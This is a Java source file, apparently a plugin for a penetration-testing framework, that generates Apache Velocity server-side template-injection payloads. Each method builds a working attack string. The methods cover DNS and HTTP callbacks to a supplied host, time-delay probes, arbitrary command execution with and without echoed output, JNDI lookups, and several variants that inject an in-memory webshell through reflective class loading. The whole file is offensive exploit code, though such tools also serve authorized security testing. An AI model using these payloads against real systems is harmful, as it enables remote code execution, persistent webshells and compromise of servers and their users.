package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
import me.gv7.woodpecker.plugin.utils.Utils;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class VelocityExpr implements IExpr {
    private String _encoder = "none";

    @Override
    public void setEncoder(String encoder) {
        _encoder = encoder;
    }

    private String out(String text) {
        return Utils.encoder(text, _encoder);
    }

    @Override
    public String getName() {
        return "Velocity";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                out("#set($x='') $x.class.forName('java.net.InetAddress').getByName('" + escape(domain) + "')")
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                out("#set($x='') $x.class.forName('java.net.URL').declaredConstructors[2].newInstance('" + escape(url) + "').getContent()")
        };
    }

    @Override
    public String[] genSleep(int sec) {

        return new String[]{
                out("#set($x='') $x.class.forName('java.lang.Thread').sleep(" + sec * 1000 + ")")
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                out("#set($x='') $x.class.forName('java.lang.Runtime').getRuntime().exec('" + escape(command) + "')")
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                out("#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('" + escape(command) + "')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"),
                out("#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"\\\\A\").next();')")
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            MemShellClassFactory bIMemShellClassFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BIGINTEGER);
            return new String[]{
                    "[+] 反射方案(该方案注射语句仅可执行一次，第二次需使用实例化语句【后附】)：==>" + System.lineSeparator() + out("#set($x='" + bIMemShellClassFactory.getPayload() + "') #set($ic=$x.class.forName(\"java.lang.Integer\")) #set($cl=$x.class.forName(\"java.lang.ClassLoader\")) #set($m1=$cl.getDeclaredMethod(\"defineClass\", $x.bytes.class, $ic.getField(\"TYPE\").get(1),$ic.getField(\"TYPE\").get(1))) $m1.setAccessible(true) #set($cb=$x.class.forName(\"java.math.BigInteger\").getConstructor($x.class, $ic.getField(\"TYPE\").get(1)).newInstance($x,36).toByteArray()) $m1.invoke($x.class.forName(\"java.lang.Thread\").currentThread().getContextClassLoader(), $cb, 0, " + memShellClass.length + ").newInstance()") +
                            System.lineSeparator() + " <==" + System.lineSeparator() + "[+] 实例化语句：==>" + System.lineSeparator() + out("#set($x='') $x.class.forName('" + bIMemShellClassFactory.getClassName() + "').newInstance()") + System.lineSeparator() + " <==",
                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out("#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE).replace("'", "''") + "')") + System.lineSeparator() + " <==",
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + out("#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')") + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out("#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')") + System.lineSeparator() + " <==",
                    "[+] JS-BCEL方案：==>" + System.lineSeparator() + out("#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL).replace("'", "''") + "')") + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常",
                    Utils.getErrDetail(ex)
            };
        }
    }

    @Override
    public String[] genJNDI(String jndiAddress) {
        return new String[] {out("#set($x='') $x.class.forName('javax.naming.InitialContext').doLookup(\"" + escape(jndiAddress, "\"") + "\")")};
    }

    @Override
    public String[] genLoadJar(String url, String className) {
        return new String[0];
    }
}
